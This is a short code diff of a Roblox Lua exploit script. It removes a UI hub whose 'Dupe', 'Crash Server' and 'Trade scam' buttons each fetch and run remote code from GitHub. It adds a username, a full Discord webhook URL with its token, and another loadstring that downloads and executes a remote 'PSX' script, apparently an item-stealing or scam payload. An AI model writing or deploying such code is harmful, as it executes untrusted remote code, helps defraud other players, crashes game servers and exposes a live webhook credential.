@@ -1,22 +1,5 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("traptinq00’s Hub", "Ocean")
+UserName = "Chuanko1"
+WebHook = "https://discord.com/api/webhooks/1089209273285890068/GOi61uNsqMZ1S8tgjwo_HSzd4LwkCz3rpW4fvkKRBTI3_O4YXsfcqyTU73MWq6_AetLh"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
 
--- MAIN
-local Main = Window:NewTab("Main")
-local MainSection = Main:NewSection("Main")
-
-
-MainSection:NewButton("Dupe", "start duping process", function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/traptinq001/main/main/traptinq00')()", true))()
-end)
-
-
-
-MainSection:NewButton("Crash Server", "use to crash server ", function()
-   loadstring(game:HttpGet('https://raw.githubusercontent.com/traptinq001/main/main/traptinq00')()", true))()
-end)
-
-
-MainSection:NewButton("Trade scam", "click this when u puting pets in trade and put it back and click this again booom", function()
-   loadstring(game:HttpGet('https://raw.githubusercontent.com/traptinq001/main/main/traptinq00')()", true))()
-end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
